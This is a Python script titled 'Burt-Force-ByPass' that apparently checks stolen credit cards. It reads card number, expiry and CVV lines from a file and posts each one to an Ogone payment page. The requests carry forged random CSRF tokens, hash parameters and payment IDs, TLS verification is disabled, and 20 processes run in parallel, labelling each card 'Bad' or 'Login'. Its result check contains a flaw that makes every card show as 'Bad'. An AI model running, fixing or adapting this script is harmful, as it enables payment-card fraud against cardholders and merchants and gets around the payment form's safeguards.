# Burt-Force-ByPass


import requests
from datetime import datetime
import string
import random
import urllib3
from multiprocessing import Pool
from colored import  fg,attr
urllib3.disable_warnings()
def CSRFKEY(size=40, chars=string.ascii_uppercase + string.digits):# (40 Letter) PW1Q5IIN38LX062G97MV839KN6G0N8IUN92K9L36
    return ''.join(random.choice(chars) for _ in range(size))
def CSRFTS():# 20220615192331
    now = datetime.now()
    return now.strftime("%Y%m%d%H%M%S")
def payid(size=9, chars= string.digits):#(10 Letter) 6718995339
    s=  ''.join(random.choice(chars) for _ in range(size))
    return f"6{s}"
def hash_param(size=40, chars=string.ascii_uppercase + string.digits):#(40 Letter) MYU1B1DJI5AQ8YE2LIGKR549NE9J29OMNMX9XOXY
    return ''.join(random.choice(chars) for _ in range(size))
def CorrelationID(size=32, chars=string.ascii_uppercase + string.digits): #CBC5A445-1118-45C7-8DFC-81E06C5A789B
    rean =  ''.join(random.choice(chars) for _ in range(size))
    return f"{rean[0:8]}-{rean[8:12]}-{rean[12:16]}-{rean[16:20]}-{rean[20:32]}"
def Ecom_Payment_Card_Name(size=15, chars=string.ascii_uppercase):
    n =  ''.join(random.choice(chars) for _ in range(size))
    return f"{n[0:7]}+{n[7:15]}"


def req(target):
    cookies = {
        'sessionProd': '******-******-401e-9b87-1f02b3261d99',
    }

    headers = {
        'Host': 'Target.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://Target.com',
        'Referer': 'https://Target.com/ncol/prod/orderstandard_UTF8.asp',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'iframe',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Connection': 'close',
    }
    s = target.split("|")
    data = f'CSRFKEY={CSRFKEY()}&CSRFTS={CSRFTS()}&CSRFSP=%2Fncol%2Fprod%2Forderstandard_UTF8.asp&WIN3DS=&branding=OGONE&payid={payid()}&version=&AcceptanceRequired=False&hash_param={hash_param()}&CorrelationID={CorrelationID()}&LimitClientScriptUsage=False&walletid=&walletalias=&wallethash=&card=&Ecom_Payment_Card_Name={Ecom_Payment_Card_Name()}&ChosenBrand=&paymethod=CreditCard&Ecom_Payment_Card_Number={s[0]}&Ecom_Payment_Card_ExpDate_Month={s[1]}&Ecom_Payment_Card_ExpDate_Year={s[2]}&Comp_Expirydate={s[2]}{s[1]}&hd_birthdate_msgbox=%D9%83%D9%88%D8%AF+%D8%A7%D9%84%D8%AA%D8%AD%D9%82%D9%82+%D9%85%D9%86+%D8%A7%D9%84%D8%A8%D8%B7%D8%A7%D9%82%D8%A9%3E&hd_cvc_msgbox=%D9%83%D9%88%D8%AF+%D8%A7%D9%84%D8%AA%D8%AD%D9%82%D9%82+%D9%85%D9%86+%D8%A7%D9%84%D8%A8%D8%B7%D8%A7%D9%82%D8%A9&Ecom_Payment_Card_Verification={s[3]}&CVCFlag=-1&ownerZIP=&owneraddress=&browserColorDepth=24&browserJavaEnabled=false&browserLanguage=en-US&browserScreenHeight=768&browserScreenWidth=1024&browserTimeZone=240'
    response = requests.post('https://Target.com/ncol/prod/order_Agree_UTF8.asp', cookies=cookies, headers=headers, data=data, verify=False).text
    if '<h2 style="display: inline; position: absolute; left: -1000px; top: -1000px; width: 0px; height: 0px; overflow: hidden;">&#1605;&#1585;&#1575;&#1580;&#1593;&#1577; &#1575;&#1604;&#1591;&#1604;&#1576;</h2>' in response:
        print(f"{target} [{fg(1)}Bad{attr(0)}]")
    elif "" in response:
        print(f"{target} [{fg(1)}Bad{attr(0)}]")
    else:
        print(f"{target} [{fg(2)}Login{attr(0)}]")
file = open("Data.txt").read().splitlines()
pool = Pool(20)
pool.map(req,file)
pool.close()
pool.join()
